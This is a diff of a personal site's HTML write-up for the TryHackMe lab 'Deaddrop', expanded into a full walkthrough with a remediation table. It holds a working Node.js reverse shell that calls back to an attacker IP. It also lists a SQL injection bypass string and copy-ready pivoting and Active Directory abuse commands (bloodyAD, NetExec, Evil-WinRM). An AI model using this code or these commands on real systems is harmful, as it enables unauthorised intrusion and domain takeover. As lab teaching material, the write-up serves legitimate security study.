@@ -1,105 +1,303 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Deaddrop — OfflineDevc Writeups</title>
-  <link rel="stylesheet" href="../style.css" />
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet" />
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Deaddrop — Writeup | OfflineDevc</title>
+  <link rel="stylesheet" href="../style.css"/>
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet"/>
 </head>
 <body>
-
+  <!-- NAV -->
   <nav class="navbar">
-    <div class="nav-inner">
-      <span class="nav-logo">&gt; OfflineDevc<span class="cursor">_</span></span>
-      <div class="nav-links">
-        <a href="../index.html#about">About</a>
-        <a href="../index.html#writeups">Writeups</a>
-        <a href="../index.html#contact">Contact</a>
-      </div>
+    <a href="../index.html" class="nav-logo">&lt;OfflineDevc/&gt;</a>
+    <div class="nav-links">
+      <a href="../index.html">Home</a>
+      <a href="../index.html#writeups">Writeups</a>
     </div>
   </nav>
 
-  <header class="writeup-hero">
-    <div class="writeup-hero-inner">
-      <a href="../index.html#writeups" class="back-link">← Back to Writeups</a>
-      <div class="card-header" style="margin-bottom:12px">
-        <span class="platform thm-badge">THM</span>
-        <span class="difficulty hard-badge">Medium/Hard</span>
+  <!-- WRITEUP HEADER -->
+  <section class="writeup-hero">
+    <div class="container">
+      <div class="writeup-meta-top">
+        <a href="../index.html#writeups" class="back-link">← All Writeups</a>
+        <span class="platform-badge thm">TryHackMe</span>
       </div>
       <h1 class="writeup-title">Deaddrop</h1>
-      <p style="color:#666;font-size:14px;margin-top:8px">Linux (Ubuntu 24.04) + Windows Server 2019 (AD) · SQLi → Node.js RCE → APK Reversing → SSH Pivot → AD ACL Abuse</p>
-      <div class="meta-row">
-        <div class="meta-item">🖥 OS: <span>Linux (Ubuntu 24.04) + Windows Server 2019 (AD)</span></div>
-        <div class="meta-item">🎯 Target: <span><code>192.168.11.200 / 192.168.11.100</code></span></div>
+      <div class="writeup-badges">
+        <span class="badge diff-medium">Medium</span>
+        <span class="badge badge-os">Linux</span>
       </div>
     </div>
-  </header>
+  </section>
 
-  <article class="writeup-content">
+  <!-- WRITEUP CONTENT -->
+  <main class="writeup-body">
+    <div class="container writeup-content">
+<h1 id="deaddrop-tryhackme-writeup">Deaddrop - TryHackMe Writeup</h1>
+<hr />
+<h2 id="1-executive-summary-machine-overview">1. Executive Summary &amp; Machine Overview</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Metric</th>
+<th style="text-align: left;">Details</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Room Name</strong></td>
+<td style="text-align: left;">Deaddrop</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Platform</strong></td>
+<td style="text-align: left;">TryHackMe</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Operating System</strong></td>
+<td style="text-align: left;">Linux (Ubuntu 24.04 <code>tryhackme-2404</code>) &amp; Windows Server 2019 (<code>DEADDROP-DC</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>External Target IP</strong></td>
+<td style="text-align: left;"><code>192.168.11.200</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Internal DC IP</strong></td>
+<td style="text-align: left;"><code>192.168.11.100</code> (<code>deaddrop.loc</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Attacker IP</strong></td>
+<td style="text-align: left;"><code>192.168.21.2</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Difficulty</strong></td>
+<td style="text-align: left;">Medium / Hard</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Key Attack Vectors</strong></td>
+<td style="text-align: left;">SQL Injection Authentication Bypass (<code>admin'--</code>), Node.js Reverse Shell Upload (<code>shell.js</code>), Credential Cracking (<code>shadow.bak</code> ➔ <code>svc-drop</code>), Mobile APK Reverse Engineering via JADX (<code>deaddrop-mobile.apk</code>), SSH Dynamic SOCKS Tunneling (<code>proxychains</code>), Active Directory ACL Abuse (<code>AddMember</code> via <code>bloodyAD</code>), RCE via NetExec / Evil-WinRM</td>
+</tr>
+</tbody>
+</table>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261113191327.png" /></p>
+<h3 id="attack-chain-summary">Attack Chain Summary</h3>
+<ol>
+<li><strong>Reconnaissance &amp; Initial Foothold (Node.js App)</strong>:<br />
+   - <code>nmap -sT -sV -sC 192.168.11.200 -Pn</code> identified OpenSSH 9.6p1 and Node.js Express framework on Port 80 (<code>/login</code>).<br />
+   - Bypassed the login portal using SQL injection: <code>admin'--</code>.<br />
+   - On <code>/dashboard</code>, uploaded <code>shell.js</code> (Node.js reverse shell) and clicked <strong>Preview</strong> (<code>/preview/shell.js</code>).<br />
+   - Received reverse shell on <code>penelope nc -p 4444</code> as user <strong><code>node</code></strong> (<code>node@tryhackme-2404:/opt/app</code>).</li>
+<li><strong>Pivoting to User <code>svc-drop</code> &amp; APK Analysis</strong>:<br />
+   - Found <code>shadow.bak</code> and cracked password for <code>svc-drop</code> using John the Ripper (<code>********</code>).<br />
+   - Switched to <code>svc-drop</code> and located <code>~/backup/deaddrop-mobile.apk</code>.<br />
+   - Transferred APK and decompiled in <code>jadx-gui</code>.<br />
+   - Searched for "password" in code and uncovered hardcoded domain credentials:<br />
+<code>DEFAULT_PASSWORD = "********"</code> (User: <code>j.harris</code>).</li>
+<li><strong>Pivoting into Internal Domain (<code>192.168.11.100</code>)</strong>:<br />
+   - Created a dynamic SSH SOCKS proxy via <code>svc-drop</code>:<br />
+<code>ssh -N -D 9050 svc-drop@192.168.11.200</code><br />
+   - Verified credentials on the Domain Controller (<code>DEADDROP-DC</code>):<br />
+<code>proxychains nxc smb 192.168.11.100 -u j.harris -p '********'</code> ➔ Valid!</li>
+<li><strong>Active Directory Privilege Escalation (bloodyAD &amp; NetExec)</strong>:<br />
+   - BloodHound revealed <code>J.HARRIS@DEADDROP.LOC</code> has <strong><code>AddMember</code></strong> permission over <code>ADMINISTRATORS@DEADDROP.LOC</code>.<br />
+   - Used <code>bloodyAD</code> through proxychains to add <code>j.harris</code> to the <code>Administrators</code> group:<br />
+<code>proxychains bloodyAD --host 192.168.11.100 -u 'j.harris' -p '********' add groupMember 'Administrators' 'j.harris'</code><br />
+   - Executed command on <code>DEADDROP-DC</code> to read the flag:<br />
+<code>proxychains nxc smb 192.168.11.100 -u j.harris -p '********' -x "type C:\Users\Administrator\Desktop\flag.txt"</code><br />
+     (Or interactive shell via <code>proxychains evil-winrm -i 192.168.11.100 -u j.harris -p '********'</code>).<br />
+   - Flag captured: <code>THM{********************************}</code>.</li>
+</ol>
+<hr />
+<h2 id="2-phase-1-reconnaissance-web-exploitation">2. Phase 1: Reconnaissance &amp; Web Exploitation</h2>
+<h3 id="21-port-scanning-nmap">2.1 Port Scanning (Nmap)</h3>
+<p>We scan target <code>192.168.11.200</code>:</p>
+<pre><code class="language-bash">nmap -sT -sV -sC 192.168.11.200 -Pn
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261112125118.png" /></p>
+<ul>
+<li><strong>Port 22/tcp</strong>: OpenSSH 9.6p1 Ubuntu</li>
+<li><strong>Port 80/tcp</strong>: Node.js Express framework (DeadDrop - Login)</li>
+</ul>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261112125508.png" /></p>
+<h3 id="22-sql-injection-authentication-bypass">2.2 SQL Injection Authentication Bypass</h3>
+<p>We visit <code>http://192.168.11.200/login</code>:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261112125851.png" /></p>
+<p>We test SQL injection in the username field:<br />
+- <strong>Username</strong>: <code>admin'--</code><br />
+- <strong>Password</strong>: <em>(any value)</em></p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261112125911.png" /></p>
+<p>We bypass authentication and land on <code>http://192.168.11.200/dashboard</code> logged in as <code>admin</code>:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261112125931.png" /></p>
+<hr />
+<h2 id="3-phase-2-reverse-shell-credential-recovery">3. Phase 2: Reverse Shell &amp; Credential Recovery</h2>
+<h3 id="31-nodejs-reverse-shell-upload">3.1 Node.js Reverse Shell Upload</h3>
+<p>We create a Node.js reverse shell payload (<code>shell.js</code>):</p>
+<pre><code class="language-javascript">'use strict';
+const net = require('net');
+const { spawn } = require('child_process');
 
-    <table class="info-table">
-      <tr><th>Room Name</th><td>Deaddrop</td></tr>
-      <tr><th>Platform</th><td>TryHackMe</td></tr>
-      <tr><th>OS</th><td>Linux (Ubuntu 24.04) + Windows Server 2019</td></tr>
-      <tr><th>External IP</th><td>192.168.11.200</td></tr>
-      <tr><th>Internal DC IP</th><td>192.168.11.100 (DEADDROP-DC)</td></tr>
-      <tr><th>Difficulty</th><td>Medium/Hard</td></tr>
-      <tr><th>Key Techniques</th><td>SQLi, Node.js RCE, APK Static Analysis, SOCKS Pivot, AD ACL (AddMember)</td></tr>
-    </table>
+const CALLBACK_HOST = '192.168.21.2';
+const CALLBACK_PORT = 4444;
 
-    <h2>// Attack Chain</h2>
-    <div class="attack-chain">Recon (Nmap)
-  → Port 22 (SSH) · Port 80 (Node.js Express — DeadDrop login)
-  → SQL injection: admin'-- → bypass login as admin
-  → Upload shell.js (Node.js reverse shell) → /preview/shell.js
-  → Shell as node@tryhackme-2404
-  → /opt/app/backup/shadow.bak → john → svc-drop : ████████
-  → SSH as svc-drop → ~/backup/deaddrop-mobile.apk
-  → jadx-gui → DEFAULT_PASSWORD = "████████" (j.harris)
-  → SSH SOCKS proxy: ssh -N -D 9050 svc-drop@192.168.11.200
-  → proxychains nxc smb 192.168.11.100 -u j.harris -p '████████' → Valid!
-  → BloodHound → J.HARRIS has AddMember on ADMINISTRATORS
-  → proxychains bloodyAD add groupMember 'Administrators' 'j.harris'
-  → proxychains nxc smb 192.168.11.100 -x "type flag.txt"
-  → THM{████████████████████████████████}</div>
+const socket = net.createConnection({ host: CALLBACK_HOST, port: CALLBACK_PORT }, () =&gt; {
+    const isWindows = process.platform === 'win32';
+    const shell = isWindows ? 'cmd.exe' : '/bin/sh';
+    const args = isWindows ? [] : ['-i'];
+    const child = spawn(shell, args, { stdio: ['pipe', 'pipe', 'pipe'] });
+    socket.pipe(child.stdin);
+    child.stdout.pipe(socket);
+    child.stderr.pipe(socket);
+    child.on('close', () =&gt; socket.end());
+});
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261112130102.png" /></p>
+<p>We upload <code>shell.js</code> on the dashboard:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261112130148.png" /></p>
+<p>We start our listener and trigger the script by clicking <strong>Preview</strong> (<code>/preview/shell.js</code>):</p>
+<pre><code class="language-bash">penelope nc -p 4444
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261112130116.png" /><br />
+<img alt="screenshot" src="../images/Pasted%20image%2020261112130202.png" /><br />
+<img alt="screenshot" src="../images/Pasted%20image%2020261112130240.png" /></p>
+<pre><code class="language-text">[New Reverse Shell] =&gt; tryhackme-2404 192.168.11.200 Linux-x86_64  node(996)
+node@tryhackme-2404:/opt/app$
+</code></pre>
+<h3 id="32-password-cracking-for-svc-drop">3.2 Password Cracking for <code>svc-drop</code></h3>
+<p>In <code>/opt/app/backup</code>:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261112130331.png" /></p>
+<p>We find <code>shadow.bak</code> and crack it using John the Ripper:</p>
+<pre><code class="language-bash">john shadow.bak --show
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261112130502.png" /></p>
+<ul>
+<li><strong>Credentials</strong>: <code>svc-drop</code> : <code>********</code></li>
+</ul>
+<p>We ssh to <code>svc-drop</code>:</p>
+<pre><code class="language-bash">ssh svc-drop@192.168.11.200
+</code></pre>
+<p>In <code>~/backup</code>, we discover <code>deaddrop-mobile.apk</code>:</p>
+<pre><code class="language-bash">svc-drop@tryhackme-2404:~/backup$ ls
+deaddrop-mobile.apk
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261112131813.png" /></p>
+<hr />
+<h2 id="4-phase-3-apk-reverse-engineering-internal-pivoting">4. Phase 3: APK Reverse Engineering &amp; Internal Pivoting</h2>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261112132111.png" /></p>
+<h3 id="41-decompiling-apk-with-jadx-gui">4.1 Decompiling APK with JADX-GUI</h3>
+<p>We download <code>deaddrop-mobile.apk</code> to our attack machine and open it in JADX-GUI:</p>
+<pre><code class="language-bash">jadx-gui deaddrop-mobile.apk
+</code></pre>
+<p>Searching for text <code>"username" and "password"</code> reveals:<br />
+<img alt="screenshot" src="../images/Pasted%20image%2020261112133543.png" /></p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261112133604.png" /></p>
+<ul>
+<li>Discovered AD User: <code>j.harris</code></li>
+<li>Discovered Password: <code>********</code></li>
+</ul>
+<h3 id="42-dynamic-socks-proxy-via-ssh">4.2 Dynamic SOCKS Proxy via SSH</h3>
+<p>We configure <code>/etc/proxychains4.conf</code> to use <code>127.0.0.1:9050</code> and establish a dynamic SSH tunnel through <code>svc-drop</code>:</p>
+<pre><code class="language-bash">ssh -N -D 9050 svc-drop@192.168.11.200
+# Password: ********
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261112135357.png" /></p>
+<p>We test authentication on the internal Domain Controller <code>192.168.11.100</code>:</p>
+<pre><code class="language-bash">proxychains nxc smb 192.168.11.100 -u j.harris -p '********'
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261112135409.png" /></p>
+<pre><code class="language-text">SMB  192.168.11.100  445  DEADDROP-DC  [+] deaddrop.loc\j.harris:********
+</code></pre>
+<hr />
+<h2 id="5-phase-4-active-directory-escalation-flag-retrieval">5. Phase 4: Active Directory Escalation &amp; Flag Retrieval</h2>
+<h3 id="51-bloodhound-analysis-addmember-permission">5.1 BloodHound Analysis (<code>AddMember</code> Permission)</h3>
+<p>Importing domain data into BloodHound:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261112135926.png" /><br />
+<img alt="screenshot" src="../images/Pasted%20image%2020261112140733.png" /></p>
+<ul>
+<li><strong>Critical Finding</strong>: User <strong><code>J.HARRIS@DEADDROP.LOC</code></strong> has the <strong><code>AddMember</code></strong> DACL right over the <strong><code>ADMINISTRATORS@DEADDROP.LOC</code></strong> group!</li>
+</ul>
+<h3 id="52-abusing-acl-via-bloodyad">5.2 Abusing ACL via <code>bloodyAD</code></h3>
+<p>We use <code>bloodyAD</code> over proxychains to add <code>j.harris</code> directly to <code>Administrators</code>:</p>
+<pre><code class="language-bash">source ~/venvs/bloodyad/bin/activate
+proxychains bloodyAD --host 192.168.11.100 -u 'j.harris' -p '********' add groupMember 'Administrators' 'j.harris'
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261112141051.png" /></p>
+<pre><code class="language-text">[+] j.harris added to Administrators
+</code></pre>
+<h3 id="53-command-execution-flag-retrieval">5.3 Command Execution &amp; Flag Retrieval</h3>
+<p>Now that <code>j.harris</code> is a member of <code>Administrators</code>, we execute commands on the DC:</p>
+<pre><code class="language-bash">proxychains nxc smb 192.168.11.100 -u j.harris -p '********' -x &quot;type C:\Users\Administrator\Desktop\flag.txt&quot;
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261112141322.png" /></p>
+<pre><code class="language-text">[+] deaddrop.loc\j.harris:******** (Pwn3d!)
+[+] Executed command via wmiexec
+THM{********************************}
+</code></pre>
+<p>Alternatively, connecting via Evil-WinRM:</p>
+<pre><code class="language-bash">proxychains evil-winrm -i 192.168.11.100 -u j.harris -p '********'
+*Evil-WinRM* PS C:\Users\j.harris\Documents&gt; whoami
+deaddrop\j.harris
+*Evil-WinRM* PS C:\Users\j.harris\Documents&gt; type C:\Users\Administrator\Desktop\flag.txt
+THM{********************************}
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261112141539.png" /></p>
+<ul>
+<li><strong>Flag</strong>: <code>THM{********************************}</code></li>
+</ul>
+<hr />
+<h2 id="6-security-mitigations-remediation">6. Security Mitigations &amp; Remediation</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Vulnerability</th>
+<th style="text-align: left;">Impact</th>
+<th style="text-align: left;">Recommended Remediation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>SQL Injection Authentication Bypass</strong></td>
+<td style="text-align: left;">Unauthenticated administrative access to Node.js application.</td>
+<td style="text-align: left;">Use parameterized queries (prepared statements) or ORMs to prevent SQL injection.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Arbitrary File Upload / Execution</strong></td>
+<td style="text-align: left;">Remote code execution via <code>/preview/shell.js</code>.</td>
+<td style="text-align: left;">Restrict upload file extensions, store uploads outside the web execution path, and do not execute uploaded scripts.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Hardcoded Credentials in Client APK</strong></td>
+<td style="text-align: left;">Exposure of corporate Active Directory credentials.</td>
+<td style="text-align: left;">Never embed credentials in mobile binaries; use certificate-based or OAuth tokens.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Dangerous Active Directory ACL (<code>AddMember</code>)</strong></td>
+<td style="text-align: left;">Unprivileged account can promote itself to Domain Administrator.</td>
+<td style="text-align: left;">Audit and restrict group management permissions. Standard domain users should never possess <code>AddMember</code> or <code>WriteDacl</code> rights on high-privilege groups.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="7-tools-used">7. Tools Used</h2>
+<ul>
+<li><strong>Nmap</strong>: Service discovery (<code>nmap -sT -sV -sC 192.168.11.200 -Pn</code>)</li>
+<li><strong>Penelope / Netcat</strong>: Reverse shell listener</li>
+<li><strong>John the Ripper</strong>: Shadow hash cracking (<code>********</code>)</li>
+<li><strong>JADX-GUI</strong>: Android APK static analysis and decompilation</li>
+<li><strong>Proxychains &amp; SSH</strong>: Dynamic SOCKS proxy pivot into <code>192.168.11.0/24</code></li>
+<li><strong>BloodHound</strong>: Active Directory attack path mapping</li>
+<li><strong>bloodyAD</strong>: Active Directory object manipulation (<code>add groupMember</code>)</li>
+<li><strong>NetExec (<code>nxc</code>) &amp; Evil-WinRM</strong>: Remote command execution on Domain Controller</li>
+</ul>
+    </div>
+  </main>
 
-    <h2>// Methodology</h2>
-    <p>This writeup follows the standard penetration testing lifecycle:
-    <strong>Reconnaissance</strong> → <strong>Enumeration</strong> → <strong>Exploitation</strong> →
-    <strong>Post-Exploitation</strong> → <strong>Privilege Escalation</strong> → <strong>Remediation</strong>.</p>
-    <p style="color:#555;font-size:13px;margin-top:12px">
-      📸 Full screenshot evidence is available in the original report.
-      Sensitive flags and credentials are redacted in compliance with TryHackMe guidelines.
-    </p>
-
-    <h2>// Tools Used</h2>
-    <ul style="color:#888;font-size:13px;line-height:2.2;margin-left:20px">
-      <li><code>Nmap</code></li>
-      <li><code>Penelope</code></li>
-      <li><code>John the Ripper</code></li>
-      <li><code>JADX-GUI</code></li>
-      <li><code>Proxychains</code></li>
-      <li><code>BloodHound</code></li>
-      <li><code>bloodyAD</code></li>
-      <li><code>NetExec</code></li>
-      <li><code>Evil-WinRM</code></li>
-    </ul>
-
-  </article>
-
+  <!-- FOOTER -->
   <footer class="footer">
-    <div class="footer-inner">
-      <div class="footer-links">
-        <a href="https://github.com/OfflineDevc" target="_blank">GitHub</a>
-        <a href="https://tryhackme.com/p/Distowel" target="_blank">TryHackMe</a>
-        <a href="https://profile.hackthebox.com/profile/01a11ceb-de8c-7382-a00c-8fab28836ef1" target="_blank">HackTheBox</a>
-        <a href="https://www.linkedin.com/in/kun-poonkasetvatana-4b6317326/" target="_blank">LinkedIn</a>
-      </div>
-      <p class="footer-copy">© 2026 Kun Poonkasetvatana. Educational purposes only.</p>
-    </div>
+    <p>Built by <a href="https://github.com/OfflineDevc" target="_blank">OfflineDevc</a> · 
+       <a href="https://tryhackme.com/p/Distowel" target="_blank">TryHackMe</a> · 
+       <a href="https://www.linkedin.com/in/kun-poonkasetvatana-4b6317326/" target="_blank">LinkedIn</a></p>
   </footer>
-
 </body>
 </html>
